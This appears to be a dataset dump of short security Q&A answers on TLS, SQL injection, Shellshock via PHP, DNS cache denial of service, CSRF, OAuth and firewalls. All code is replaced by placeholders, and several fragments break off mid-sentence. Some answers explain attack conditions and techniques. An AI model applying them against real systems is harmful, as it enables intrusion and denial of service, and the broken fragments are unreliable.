As for the legal bit, well... here's the technical bit: All three services are encrypted, but there's some concern about the scope of that encryption: Client-only encryption: {code-blk} If your worry is eavesdropping by between you and your provider, then client-only encryption is fine. If you want to make sure that there is no evesdropping or modification anywhere along the path between between me and you, then only end-to-end encryption is sufficient. Voice and data are often encrypted end-to-end simply as a matter of performance: it's a lot of data to move around, so the traffic goes directly between the two callers (""Peer to Peer""), which means it's also encrypted from one caller to the other. Text data (chats) are typically routed through the provider's servers. This allows them to store chat history and deliver messages to offline users when they come back online. These are typically not encrypted end-to-end. As for as who does what, all three systems are proprietary, so you don't know. We know with certainty that Skype's text messages are not encrypted end-to-end because , we know Google+ text messages are not end-to-end encrypted because your chat history shows up in your Gmail box. And it appears that Apple has access to your facetime text messages as well. As for the security of voice and video; as mentioned before, peer-to-peer communication is typical, which would prevent snooping. But it is at least possible for all these providers to route traffic through their own servers as intermediaries, perhaps on a call-by-call basis. But perhaps most importantly: All three of these services are more secure than a telephone. The security of telephone calls is approximately zero.

That meant people could interact with the Plupload applet from any other site on the Internet by embedding it on a page and using JavaScript. But due to the way the same-origin policy works in Flash, the applet could still make requests back to the domain on which it was hosted. In addition, people can specify the full URL for an upload request via JavaScript and the result of that request (ie: the HTML of the resulting page) is passed back via JavaScript to the embedding page. So, if an attacker could convince a target to interact with the applet (by selecting a single file to be uploaded), the attacker could make a request to the domain that the applet was hosted on and read back the full response. That could disclose CSRF tokens or other sensitive information.

For ephemeral Diffie-Hellman (DHE) cipher suites, the RSA private key is only used for signing the DH parameters (and not for encryption). These parameters are used in a DH key exchange, resulting in a shared secret (effectively the pre-master secret which is of course not visible on the wire). Wireshark supports various methods to decrypt SSL: By decrypting the pre-master secret using a private RSA key. Works for RSA key exchanges and subject to the above limitation. Using  which maps identifiers to master secrets. The available identifiers are: The first 8 bytes (16 hex-encoded chars) of an encrypted pre-master secret (as transmitted over the wire in the ClientKeyExchange handshake message). ({code-blk}. The resulting patch should then be  as I did here: . The stable 1.12 series have vastly improved cipher suite and TLS support, so you should not have to manually patch it now.",117,306,2,True

","The easiest way to do what you're asking is simply to use  to connect to the site with a restricted cipher list.  And, in fact, the same approach will work for a number of tools - certainly with most programming or scripting languages (Python (as @terry-chia suggests), Perl, tcl, C...) and with browsers (some ). Let's walk through how you can do this with openssl. Determine ciphers you want to try You can use the tool  to determine ciphers that a given site accepts or rejects: {code-blk} Note the following signs: We do not see the ""handshake failed"" error message Instead of ""New, (NONE), Cipher is (NONE)"", we see ""New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-SHA"" We also see the same Cipher listed under the SSL-Session section. You can see where I typed in an HTTP command ""TRACE / HTTP/1.0"", and where Google responded ""HTTP/1.0 405 Method Not Allowed"".  You would not be able to do this or see this if the cipher had been rejected, obviously; you can only talk to the HTTP server if the SSL connection was nailed up successfully. Caveats This is relatively easy in openssl command line.  Doing it in code may be harder, depending on the language and the library used.  Doing it in browsers may be painful, because such fine-grained control is not readily accessible - for example, if Chrome is using the OS for SSL on Windows, you need to figure out the registry keys used to manipulate SSL. Another problem can be figuring out which cipher string you want to test.  If you're investigating the report of another tool, as your question suggests, it's probably not describing the cipher problem it sees in terms of an OpenSSL cipher string.  More than once I've ended up on the phone with support asking ""What exactly are you referring to when you say 'weak cipher'?""",265,482,2,True

","Edit: in light of OP's reference to Blind SQL Injection I can't see any way in which ""string based SQL injection"" could be interpreted specifically as a form of blind SQL injection. Blind SQL injection can occur on any data type, not just strings. Of course it can be string-based, but no more so that normal SQL injection can. Admittedly, there are at least a couple of articles online but I believe these have confused the term. E.g. Articles from more reliable source like OWASP don't seem to make any link between the terms ""string based"" and ""blind"", but please feel free to correct me. Furthermore, your question seems to describe what is known as  which isn't blind, nor is it specifically ""string based"". Nevertheless, here is my original answer that covers SQL Injection of strings in comparison to other data types... This comes down to where the vulnerable parameter is being injected; more specifically, whether it's being injected inside quotes (a string) or otherwise (e.g. integers, timestamps etc).

","I'll use BIND as the example server software here, for the obvious reason. 1) You can't fill up the disk of dns caching servers.  Cache is in memory, not on disk.  The only way the cache goes to disk is if the administrator goes in and triggers a dump to disk by hand (and that dumped version isn't used by the cache server, it's just there for the administrator to debug with). 2) You can DOS - or at least impact the performance of - caching DNS servers by filling up the cache.  Consider  - granted, it's 10 years old, but BIND has always been remarkably predictive of BIND. 3) I'm not even sure AXFR gets cached, or that cacheing nameservers will handle AXFR queries.  For example, you can query this example domain directly: {code-blk} That being said, I couldn't find a good reference that would explain what BIND's caching server will or will not do, so it's hard to make a sweeping statement. 4) Bottom line: Sure, you could DOS a DNS server, but I'm not sure your ""large AXFR"" method is likely to do it.  And any such DOS would be temporary (in memory), not systemic.  A more likely method would be to create a ginormous number of A records with large TTLs and query them all individually.

Also it is also used to internal threats like employees in an enterprise. In an enterprise, there will be Database Administrator and Developers. They are different roles. Now to prevent the employee users to access to the sensitive data, they need to have access to both application and DB to get access to the data.

No, the  is all about the size of the cyclic group, not about the element(s) that generate the group. So when both elements are generators for a group, it doesn't make a difference. Choosing 2 as generator has a couple of advantages, though, because you can implement the underlying algorithms more efficiently.

Its going to leak information if it lacks the PRP notion of security; not because of low-entropy data like SSNs. For example, RSA/OAEP can effectively mask a SSN.

","To add to what has already been said, I can think of 2 more reasons why changing passwords regularly is helpful: 1) When computational power raises substantially Say, in early 90s 7-char passwords were considered secure because computers weren't nearly powerful enough to bruteforce them. 24 years later systems which still have the same password can be successfully bruteforced. Some calculations, considering the password consists of 24 letters (uppercase and lowercase), 10 numbers and 10 symbols, and Moore's law (x2 more power every 2 years): {code-blk} This is more about increasing minimum required password length, but it should be done regularly and short passwords should be changed. 2) Compliance with ISO/IEC 27001/27002 standards From ISO/IEC 27002:2013, section 9.4.3: A password management system should: ... e) enforce regular password changes and as needed; 3) Compliance with PCI DSS standard From PCI DSS v3, section 8.2.4: 8.2.4 Change user passwords/passphrases at least every 90 days. 8.2.4.a For a sample of system components, inspect system configuration settings to verify that user password parameters are set to require users to change passwords at least every 90 days. 8.2.4.b Additional testing procedure for service providers: Review internal processes and customer/user documentation to verify that: Non-consumer user passwords are required to change periodically; and Non-consumer users are given guidance as to when, and under what circumstances, passwords must change.

","You can't, unless you have administrative control over the 3rd party web server, or retrieve the certificate via some other nefarious means. SSL/TLS is reliant upon the private certificate staying private. Furthermore, even if you had the server's private key, you might not be able to decrypt traffic from an earlier session if  was used. In that case you would have to know the specific private key used for your single session. In principle, because you are the client, you are privy to the pre_master_secret which is what you need to derive the master_secret. The master_secret is the symmetric key that's actually used to encrypt your session. As @pqnet said, , although it is dependant upon the client software, and I'm not sure about Flash. However, there are more trivial methods to inspect your own HTTPS traffic... Local Proxies Since it is your own connection, there is no reason why you can't pass the website through a proxy server. Many proxy servers are configured to allow SSL-pass-through, which still gives you end-to-end encryption, but you can break this by terminating your connection at the proxy server (if you trust the proxy's SSL certificate). The proxy will then establish it's own SSL connection to the 3rd party website, passing along any traffic you send. Companies sometimes use the same method to inspect their users' outgoing HTTPS traffic (that's a contentious one). Essentially it's a man-in-the-middle. {code-blk} Local proxies run on your own machine, and allow you to inspect and even modify traffic that passes through them.

","There's an even easier way to bypass the ""execute"" permission: copy the program into a directory you own and set the ""execute"" bit. The ""execute"" permission isn't a security measure.  Security is provided at a lower level, with the operating system restricting specific actions.  This is done because, on many Unix-like systems (especially in the days of Ritchie and Thompson), it's assumed that the user is able to create their own programs.  In such a situation, using the ""execute"" permission as a security measure is pointless, as the user can simply create their own copy of a sensitive program. As a concrete example, running {code-blk} trying to get a ""write"" file descriptor for the hard drive and failing, because the user I'm running it as doesn't have permission to do that. The purpose of the ""execute"" permission is two-fold: 1) to tell the operating system which files are programs, and 2) to tell the user which programs they can run.  Both of these are advisory rather than mandatory: you can create a perfectly functional operating system without the permission, but it improves the user experience. As R.. points out, there's one particular case where the ""execute"" permission is used for security: when a program also has the ""setuid"" bit set.  In this case, the ""execute"" permission can be used to restrict who is permitted to run the program.  Any method of bypassing the ""execute"" permission will also strip the ""setuid"" status, so there's no security risk here.",105,358,1,True

","From my testing it does seem possible to exploit via PHP using mod_php if certain conditions are present. /bin/sh would by symlinked to /bin/bash. The PHP app would set an Environment variable from a user-controlled HTTP variable using putenv(). Somewhere in the PHP script, there is a subsequent call to a command exec function that will then load that env variable (exec(), passthru(), system(), popen(), etc) since its running in a bash shell instance. This system call/command exec function does not need to be related at all to the setting of the environment variable, as long as it happens afterwards. For example, here is generalized form of some code I saw earlier today that sets a LANGUAGE environment variable based on an unsanitized GET parameter. The popen call I added to the bottom would be the trigger. {code-blk}so tampering with that header value could also trigger the vuln. Obviously it's really bad practice to set any variable based on untrusted user data. In this case, its the call to popen (which runs in Bash thanks to the symlink) that will ultimately execute the payload. I tested this in a Debian environment after setting the symlink and the payload executed successfully. In line with what hspaans said, you're not able to influence the setting of arbitrary environment variables with calls to system() or exec(), so the success of exploiting something like this is completely dependent upon the design of the application and the environment in which it runs.

Several cryptanalytic approach exist that can be adapted to your case. A simple distribution test will reveal that it's worthwhile to run an attack.

However, in  it states the following: ISAKMP can be implemented over any transport protocol or over IP itself.  Implementations MUST include send and receive capability for ISAKMP using the User Datagram Protocol (UDP) on port 500.  UDP Port 500 has been assigned to ISAKMP by the Internet Assigned Numbers Authority (IANA). Implementations MAY additionally support ISAKMP over other transport protocols or over IP itself. ISAKMP can be implemented at either Layer 3 (IP) or Layer 4 (Transport).  Implementations must have support for transport layers, and optionally support an IP implementation. IKE is one of the most common protocols used to negotiate IPSec keys.  However both KINK () and IKE use UDP packets to perform their exchange of keys between two peers. While ISAKMP can occur at either IP or Transport it's most commonly implemented over Transport which would place it at Layer 5 (Session), but it could sit at Layer 4 (Transport) if it's implemented over Layer 2.",355,358,7,True

This permits a     primary key that collects certifications (key signatures), but is used only for certifying subkeys that are used for encryption and signatures. Signature Types Which (signing) operations are now to be considered certifications and depend on this capability?

This might the only one not requiring certification capabilities. Yet GnuPG only creates revocation key signatures for primary keys. Another hint only primary keys should be allowed is that subkeys are always named as such if they apply in that section, so I'd assume only primary keys should be allowed. Meaning of Certification Privilege If I remove the primary key (with its Certify capability) from a keyring I can see that I am no longer able to generate a revocation certificate: Secret parts of primary key are not available. Is that because I no longer have the Certify capability, or because I no longer have the primary key (does the primary key itself have special powers for revocation?)

Hybrid encryption systems use asymmetric encryption to encrypt a random key for symmetric encryption, while the actual message is symmetrically encrypted. In OpenPGP, this key is called the session key. Multiple Recipients This has another advantage: If multiple recipients should be addressed, there is no need encrypt the message multiple times.

","Client certificates are used to authenticate the clients, so they should have nothing to do with your server certificate. Step 1 Client certificates are signed by a CA. If you tell your web app (your server) to trust that CA, then your server will accept the client certificate. Simple as that. Depending on your setup, this is easy to do. For example, for Apache, you can add the following in httpd.conf: {code-blk} Where the 'SSLCaCertificateFile' contains the path to the certificate of the CA which was used to sign the client certificates. Step 2 Step 2 is then to make sure the client is known (but this should be irrelevant for your question).

",You should look at oauth 2.0 (RFC 6749) it has a number of flows which could meet your requirements. Firstly you need to know if the clients are public or confidential. Issuing client api keys as you are doing is pointless if the clients are web browsers or apps downloaded to mobile devices as the secret can't be maintained. If they are servers then api keys are good. So that is your first consideration. Section 2.1 of the rfc deals with client types and that will determine which flows are applicable. You need to separate identification of the client service from the user the client is acting for. Your backend database should have association of users with tenants and possibly api keys with users or user+tenant if you want to scope to just a single tenancy. I've implemented services where users can participate in multiple tenants so that may or may not apply to your case. I have successfully used the resource owner password credentials grant request so that a user can provide their username and password from a web browser. It sounds like you have used an out of band method to authorize the client so user credentials are not required. But if the client is a web browser or mobile app you can't rely on client auth and must get authorization from the user and that means providing user credentials. Regardless of the flow you use you end up with a response as follows: {code-blk} If your clients are using TLS then bearer tokens are the simple way forward. See section 7.1 of the RFC for more details. Finally since access tokens are only temporary your clients can use the refresh token to request a new access token once the access token nears or exceeds its expiry.  Its up to you if you want to use refresh tokens or not. Clients will need to store them securely at least the same level of protection they use for their api keys. In your system refresh tokens may be unnecessary for server-server interactions if the access lifetime is sufficient and user authentication is not required. If user authentication is required then refresh tokens may be useful if the client storage provides a sufficient level of protection.,138,470,1,True

","TL;DR It protects against having to manually configure services to only listen on localhost, as you have to manually allow them network connectivity, and it increases the effort an attacker must exert to recon your box. This means it's an effective tool both against attackers and poor configuration.  Yes, you should run a firewall. Detail Ports have 2 main states: Open (Service is listening) Closed (There is nothing listening) You appear to be familiar with the two states - ports default to ""closed"", switching to ""open"" if there is a service listening.  It's very fast to enumerate both open and closed ports - the OS will actually send a response saying either ""there is a service here"" (port is open), or one saying ""there is no service here"" (port is closed). If you use a firewall, it provides the option to filter ports.  For filtered ports, the OS does not respond at all.  This means an attacker must invest more time to determine port states, as they have no way to know if the computer didn't send any response, or if the response was lost in transit. Additionally, if you're running a firewall, you protect yourself against accidentally exposing additional services to the Internet.

For some reason, the OpenSSL developers choose not to require an empty Client Key Exchange message when the client provides a DH cert. (Even though this is required by the RFC.) The reason why the fix from the OpenSSL team does not break client authentication with DH certs is the ssl3_get_cert_verify() function is not called if ssl3_get_client_key_exchange() read the key from the certificate.

","Android essentials does when installing applications.  Each app gets a group assigned to it, and only that group can access the data for the app.  In a Unix based system this is rather simple to implement.  Windows gets a bit harder. Access Control Lists What you can do is  for your application.  These can be converted into Security Descriptors which can be used with functions like CreateDirectory.  The DACL will contain all the information about who can access the folder.  In this case you'll probably want to create a Windows group for the application. When you create your directory you can restrict access to the DACL you create.  When your application runs/needs to access the directory it acquires the DACL, and uses it in subsequent system calls.  These aren't the easiest Windows object in the world to work with, but they do what you want. Creating Users You can create a User Profile in Vista+.  More than a little tricky because Windows wasn't designed for this.  Impersonating a logged on user requires some type of access token for the user you're attempting to use.  There are  that would return such a token: {code-blk} access. LogonUser requires a password.  You probably don't want to hardcode one into your application.  DuplicateToken only generates impersonation tokens, which can't be used with CreateProcessAsUser (which is our end goal).  Now we're left with a bunch of functions that require an existing token to duplicate and start from.  That means you're left with the current user's token which is not what you want. Creating tokens is pretty much out of the question.  That operation is often only done by LSASS, and I wouldn't be surprised if this whole behavior was flagged by Anti-viruses.  In Windows this approach is probably a bad idea, and not worth the amount of flaming hoops you would have to jump through to make it work.",28,445,3,True

","Google Authenticator is a offline authenticator. It can both be time-based or event based. Time-based means it will use a Clock to detect the correct code to display. To prevent desynchronization because the Clocks are imprecise, you simply have a correction factor, so you configure the server to accept a previous code, current code, or a later code. If a previous code is used, you store ""-1"" in database. If a later code is used, you store ""+1"" in a database. And then you decrease or increse the number according to syncronization. ""-1"" would then mean you accept the code corresponding to time -2, time -1 and time. ""+2"" would then mean you accept the code corresponding to time +1, time +2, and time +3 A important thing is to store the time of the last accepted code, so codes that are equal or previous to the used code cannot be reused. Since the authenticator is completely time-based, it will mean the same key can be used for unlimited number of servers. Please note that if servers are offline or cannot talk with each other, then a spent code from a machine can be reused at Another machine, provided it hasnt expired in time. You can also use a Event-based setting, with a counter that Counts up for each display of the code, and then you simply accept all codes that are up to lets say 50 events in future, and then store the Count of the last used code so codes cannot be reused, but then you need one unique key for each machine. The KeyURI format is to initalize the Google Authenticator, normally you embed the KeyURI in a QR code displayed on screen on account setup, and then you scan it with Google Authenticator to add the seed to Google Authenticator. You simply type a friendly name as ""label"", for example: ""Server at 192.168.10.3"" And then when you look in Google authenticator, you might see: {code-blk} and so on.

","Do bitcoin miners(or some of them) accept customizable inputs and hash them in bulk(instead of accepting some more high-level instruction and do mining works automatically)? Bitcoin miners generally take a parameter called ""target"" and ""header"" and return a nonce+overflow.  I don't think it's possible to hash X times, resulting in predictable output (e.g. you want to compare hashes).  The Bitcoin game is one of ""finding a lower number"" and ""hash as fast as you can until you do"". Yes, Bitcoin is literally comparing the SHA2 output of two values as a BigInteger and should only return when this is found.  (maybe what you need is possible, but I would think this feature would introduce inefficiencies for the Bitcoin game and would be undesirable) Here is what goes on inside bitcoin miners: Note: step 3 and 4 is Bitcoin Hardware, the rest is your custom driver software Step 1 At a high level, the miner software takes a list of active transactions, and then groups them together in something called a ""block"". Or more accurately stated: The miner software coverts all the transactions into a summary view called a  ""merkle root"", and hashes it, which is representative of the transactions. Step 2 Then mining software converts this to into a binary format called a , which also references the previous blocks (also called a chain). {code-blk} Summary So at the end of the day, all a miner does is: Take a block header as input Change the Nonce Test if the Block Header hash is less than the Target.

The fact that the real user has logged in should not reset the counter for the attacker. Of course you could track sessions and only lock out the user if they are on a different session than the real user, however here there is more risk of implementation bugs meaning you could inadvertently introduce something that allows an attacker to work around the lockout. With security it is often best to keep things as simple as possible. You should also rate limit repeated attempts from the same IP address as that will help protect against a horizontal attack against different user accounts. The above is comment on your current proposal, however I would also go for an increasingly delayed response rather than locking out. e.g. {code-blk} That way the real user will be able to log in during a brute force on their account and the attacker cannot cause a Denial of Service on the legitimate user. For longer delays you could display something to the user to show that their login is in progress so they would not be tempted to click again. Of course you do not want the maximum delay to be much longer than several seconds, however adding an artificial delay across threads will delay an attacker.

","Answer 1: if the server uses SSL/HTTPS(verified  by third party-not self-signed certificate), cookies and session IDs travel as cipher-text over the network, and if an attacker (Man in the Middle) uses a packet sniffer, they can not obtain any information. They can not decrypt data because the connection between client and server is secured by a verified third party.so HTTPS without verified certificate means server and user can not make sure that session ID is not sniffed. it means that every data (i.e cookies) must be send and receive after establishing a secured HTTPS between user and server and can make sure that the session ID is securely sent to the user. also asymmetric cipher just use for exchanging key of symmetric cipher(that is used for ciphering data between client and server). for better image right click: open image in new window Answer 2: Cookies are handled entirely by the request header in HTTP header fields, cookies in the client side are encoded in the 'Cookie' and 'Set-Cookie' response header and in the server side are encoded in the 'Cookie' request header - $Path variable.

First element is the DH modulus as a big integer, with a two-byte length header. Here, the length is encoded as 01 00, meaning an integer encoded over 0x0100 bytes. That's 256 bytes, so the modulus has length between 2041 and 2048 bits. The modulus bytes follow, in unsigned big-endian order. The top bytes of that modulus are, in this case, ff ff ff ff.... The modulus then has length exactly 2048 bits. Using this method you can also make sure, that your server doesn't use the DH Groups predefined in RFC 3526 (which my Apache2.4.7 using Ubuntu 14.04 still does, although  states that this version should use DH parameters added to the PEM-encoded SSLCertificateFile).",122,349,1,True
7551,"  Since requests directed ultimately to AS112 servers are usually
  triggered automatically by applications, review of firewall logs
  may indicate a large number of policy violations occurring over an
  extended period of time.

  Where responses from AS112 servers are blocked by firewalls, hosts
  will often retry, often with a relatively high frequency.  This
  can cause inbound traffic to be misclassified as a denial-of-
  service (DoS) attack.  In some cases, the source ports used by
  individual hosts for successive retries increase in a predictable
  fashion (e.g. monotonically), which can cause the replies from the
  AS112 server to resemble a port scan.

  A site administrator may attempt to perform active measurement of
  the remote host in response to alarms raised by inbound traffic,
  e.g. initiating a port scan in order to gather information about
  the host which is apparently attacking the site.  Such a scan will
  usually result in additional inbound traffic to the site
  performing the measurement, e.g., an apparent flood of ICMP
  messages that may trigger additional firewall alarms and obfuscate
  the process of identifying the originally problematic traffic.
","Is this a spoofed SYN flood? At first glance, this may look like an attack. An attacker can initiate a SYN Flood without using his real IP address. An attacker crafts a packet with an origin IP of a known IP such as that of a blackhole dns server. Your server may exhaust resources while attempting to respond with a SYN-ACK packet. How can I tell If your server does respond with a SYN-ACK packet, then the original packet is likely spoofed if the server doesn't respond with a final ACK packet. Why am I seeing TCP traffic for DNS? Per A request sent to one of these servers will result in a response being returned to the client.  The response will typically be a UDP datagram, although it's perfectly valid for requests to be made over TCP. In both cases, the source port of packets returning to the site that originated the DNS request will be 53. Explanations provided by RFC6305 Section 6 of  provides further explanations of why you may see this traffic. Inbound Traffic from AS112 Servers Where firewalls or intrusion detection systems (IDSs) are configured    to block traffic received from AS112 servers, superficial review of    the traffic may seem alarming to site administrators. {code-blk}",249,296,2,True

In the case of cross-certification between distinct CA, the several chains for a given server certificate may even lead to distinct root CA. The consequence is that while the SSL/TLS server is supposed to send a ""valid chain"", that chain may not necessarily be the one that the client would have preferred. In general, SSL/TLS clients will try to validate the server certificate chain as received from the server. If that chain does not please the client, then the client's behaviour depends on the implementation: some clients simply give up; others (especially Windows/Internet Explorer) will try to build another chain using locally known intermediate CA and also downloading certificates from URL found in other certificates (the ""authority information access"" extension).",92,255,1,True

Plaintext passwords are typically sent to the server for the application to hash and compare against what is in the database. I say typically in both cases, because there are exceptions. For passwords sent to the server, a protocol called SRP can be used to never send the password to the server. But it is not used very often. What can an attacker do? Attacks against hashing algorithms exist, such as the MD5 discussion linked above, that allow the plaintext passwords to be discovered. Common hashing that applications use include: MD5 SHA1 SHA256 SHA512 bcrypt scrypt Tools are out there that build hashes of known words and compare them against the desired hash.

","In highly doubt that the password information is really transmitted by the server. Well, assuming that there is in fact such kind of information present: Retrieving this kind of information by sniffing the HTTP transferred data when received or sent. The significant information should be a part of the received data and the sent data. Retrieving the password information from the DOM. I can mention two excellent addons for Firefox to potentially achieve this goal. Tamper Data: to catch the HTTP data Firebug: to look up the DOM and HTML You may face the problem that the password will not be plain text. This may indicate that the data must be decrypted on the client side by some script. Then, there would be only a shot sequence where the information is genuine. Every further security should now depend the verification process on the server side. Even thou this seems to be the best method to guarantee security, a large part of the process depends on the front end so there it is vulnerable. Overall it really depends on the real security sequence used for this process. The best way to grab genuine data is while the client sends the data, assuming there will be no encryption process before the data is sent. I don't believe that HTML itself provides advanced features to handle such kind of data, just hiding the content. But I highly assume that the data is processed by a script on the client side to keep the information secret. This would be the best way to compensate the missing security.

While generating a CSR, a private key is created (used to decrypt) Submit this CSR (plain-text) to a Certificate Authority (CA) The file can have any extension and any name, you can either submit the file to the CA, or open it with a text editor, copy and paste its content in the CA Web Interface.

Your Web Server need to know what/where is the private key, and what/where is the certificate so it might rely on extensions and need to be saved in a specific location, a specific format. I would refer you to your Web Server documentation (Nginx, Apache, IIS ?) to find out.

","Three of the answers presently contributed require lowering the security level of your browser, possibly leaving you open to  if you do this in your primary browser, subsequently use that browser for other web sites, or simply forget to revert this change (or multiple changes). Legacy and insecure SSL/TLS features (SSLv2 and , SHA1RSA signatures,  and 3DES ciphers,  MAC, export ciphers, non PFS ciphers, <1024 DH parameters) are progressively being disabled by default and/or removed from browsers, and for good reason. A separate problem that @AndreKR helpfully flags is that of browser compatibility, in which case a legacy browser in a dedicated VM is probably the most robust solution. If you cannot replace the device, use dedicated VM or a dedicated browser. The next best option is a TLS proxy to allow the use of a contemporary secure browser. Enabling one, (or two, or three ...) insecure features in a browser is not a secure and sustainable solution, and when the inevitable happens and a required feature is removed entirely? (SSLv3 support for , , ). A secure alternative is to proxy the connections through something that supports both old/legacy and new protocols & ciphers, there are many options (including the rather heavyweight solution of an Apache reverse proxy). The following more lightweight solution should work on both *nix and Windows systems.

I suggest to create an API that handles the authentication and communication to the back-end server.

Care-provider - router encryption: The care provider sends information as metadata for us to be able to handle it. This information needs to be encrypted. The contract stated that the messages still had to be encrypted even inside our network so that only one of our servers ever knows the metadata of the information being sent. Since we have several pipes (load balancers, firewall, etc.), encryption is required at this level as well.

The server will then generate a hash for the password, like so: {code-blk}); simply do not allow them to log in.",344,157,1,True

","Yes, it is. By how much, and if it would be ok for you to allow forms depends on your specific situation. CSRF with referer checks If your CSRF protection depends on referer checks, not on a token, allowing forms means that you would be vulnerable to CSRF. As you disallow scripts, a victim would still need to actually click the form, but that can be achieved via social engineering or maybe ClickJacking. For example, an attacker could place a paypal button, which would actually add a new admin user, in the hopes that you click it. Of course, this is also possible with links, but only for GET requests, not for POST requests. CSRF with existing forms It sounds that your filter is a general filter, filtering out all possibly dangerous tags. But there are specific situations where you definitely do not want form tags, eg when echoing user input inside forms. If you eg have a user edit form like this in the admin backend: {code-blk}. If they now get the admin to edit their profile, they would be admin, without the admin wanting to make them admin. Phishing A form could also be used for phishing attacks. This again depends on the specific context where your user input is put, but theoretically, an attacker could for example display a form asking for login credentials, credit card details, etc, and then send them to their own server. The hope is that the victim would not interpret the form as user input, but as belonging to your website.",128,342,1,True

","This is a problem that has been solved by OAuth 2 and Open ID Connect (OIDC). I would strongly suggest building on it rather than inventing your own protocol. Take a look at the . First off, it helps to split authentication from authorization. Authorization is what you want to achieve (i.e. authorizing the TV). Whether the authentication workflow requires login or not, or involves multiple factors is something that should be considered separate from the authorization workflow and may be something you want to be configurable. Diagram below outlines the OAuth 2 device workflow. {code-blk} The auth code can be in QR form that the user scans with the mobile app, or it can simply be a code that the user will have to manually type into their mobile app. In the aforementioned Google link, what they describe as device ID may be the UUID you mentioned, but it could also be a securely generated random string associated with your app. There are guidelines in OAuth 2 and OIDC for utilizing shared secrets, which are only necessary for protecting credentials. In the workflow above since the mobile app is responsible for authentication, it has the option of using a shared secret with the Server (also known as a confidential client) or not (also known as a public client). The question of whether you need authentication depends on where your Server resides. If it is on the internet, authentication is recommended - many OAuth 2 server libraries/applications let you integrate with various social media accounts so this may not be as painful as you'd think. On the other hand if the Server resides in the user's local home network then perhaps authentication is not necessary. There plenty of client and server OAuth 2/OIDC libraries that will make your life easier. For the server side you can even make use of server applications (e.g. ) sporting features such as TOTP to improve security.",123,412,2,True

","I will answer this although it seems to be worded sketchy. Calling cards, and credit cards do not work in a manner as you infer/interpret. In a calling card system, especially pre-paid cards, when you make a call it works like this: {code-blk} As described above, the calling card is nothing more than an identifier (PIN) that gets authenticated (Calling card number you call), then a determination is made based on that PIN: ""We used that specific PIN as a pre-paid $5.00 calling card... Caller used X amount of minutes. ""Enter the number you wish to call"" (this is how many minutes you will have to make this call)"" Most calling card platforms have since moved over to either entirely VoIP, or a hybrid combination (VoIP + POTS lines) since it is cost-effective, and generates more revenue. Many of these PIN/calling card systems sit behind an SBC (Session Border Controller) that have controls in place to detect fraudulent activity.

","Not an answer but you asked for suggestions and this would be a lot for (SX) comments. (0) {code-blk} openssl supports a variety of hashes, but unless you need to consider other factors I would use sha256 or sha512, the latter especially on 64bit machines. Hashes now officially broken or endangered for general signature (MD5, SHA1) would actually be safe in your application, but that can be complicated and timeconsuming to justify to people, so just avoid the problem. If you really want encryption and authentication, although as above I don't think you need it, authenticed encryption modes GCM and CCM (which do both at once) are available in openssl library but not (currently?) in commandline, so easiest is to just encrypt and then authenticate with either/any of the above. The key (as it were) is encrypt then authenticate, and conversely verify then decrypt; this blocks the malleability and oracle that apply to unprotected CBC (and most other) encryption.",272,240,1,True

8269,"You have a message that you want the world to know came from you
You have a public/private key pair that supports signing (RSA, DSA, etc.)
You take a cryptographic hash (usually something like SHA-256) of the message
 - Like asymmetric encryption, signing schemes work best on small bits of data
You create a digital signature of the hash digest (the output of the hash function)
 - This requires your private key
You distribute the message, the signature, and the algorithms (hash and signing) used
Alice has your public key, and wants to confirm that the message is authentic
Alice re-hashes the message, with the same scheme
Alice then uses your public key to turn the signature back into the hash digest
Alice checks if the digest of the message and the digest from the signature match
 - This is called verifying a signature
","First of all, as @WhiteWinterWolf points out, this is a digital signature scheme. Digital signing is specifically for the purpose of making sure that the message is from you, not somebody else, and hasn't been modified since it was signed. Without going into the math, here's how it works: {code-blk} Cryptographic signatures are used all over. They're used in X.509 certificates (like SSL/TLS uses) to verify that the certificate was issued by a trusted authority, and hasn't been tampered with. They're used in secure email, to make sure that the recipient knows the sender of the mail wasn't spoofed. They're used with signed files, usually executable binaries, so that the author of the file is known. That's just a few of the common uses. Now, with that said, let's be clear about something: Encryption, in general, does NOT provide authentication (proof of the identity of the source of the message) or integrity (confirmation that the message has not been tampered with); only confidentiality (also called privacy or secrecy). If you encrypt a message, but don't sign it (or provide some other form of verification), an attacker can take the encrypted message and manipulate it, changing the meaning even though the attacker doesn't know what the original text was. The recipient of the message can then decrypt the message, and may have no idea it was tampered with. For some stuff, this isn't very meaningful; an attacker tweaking English text that they don't know the content of will produce meaningless gibberish. For other things, though, it can matter a lot. Do not rely on encryption to verify where a message comes from! (Caveat: if using an ""authenticated encryption"" scheme, that includes integrity checks and, if nobody else has the key, also provides authentication. You shouldn't assume that encryption provides these things, though; most of the time it doesn't.)",187,459,1,True

","Facebook can be blocked in many ways: On proxy like squid / sslbump mentioned On Firewall and DNS Facebook is using it's own netwo rk ranges and there's more than just Facebook, but all is social essentially like Instagram. You need also to think what to do with ""requests to Facebook"". You can setup a zone on your local DNS server ""facebook.com"" and direct all traffic to dummy server with no webserver on it, so it returns ""connection refused"". This is because when you block on the firewall, this might block web browsers. You need to setup all ""top-level"" facebook domains like ""*.facebook.com, *.fbcdn.net"" and so on. You can also make DNS to not respond anything at all. See the list of Facebook domains: Instead of the DNS, you can make firewall not slowing down browsers by sending ""connection refused"" response by itself. This can be done by doing redirection to local port or to dummy server with no port open. Here's some example but that's not for router, it's for stand-alone host, but it shows that to block website without slowing-down browser you need to tell the browser that the port is closed using TCP/IP and not just ICMP. This can be done by redirecting outgoing port to local port: {code-blk} This is very reliable way of doing it. Some firewalls may be able to block the port in such a way that the redirection is not needed. So you can use both Firewall and DNS (or just the Firewall), or you can use the proxy option. Going  with the proxy option is good when you have it already in place. This is big change for the company and it might introduce issues with privacy, for example, someone might break into the proxy and sniff all the traffic to the cloud like Gmail and Office365 as it's re-encrypted there.

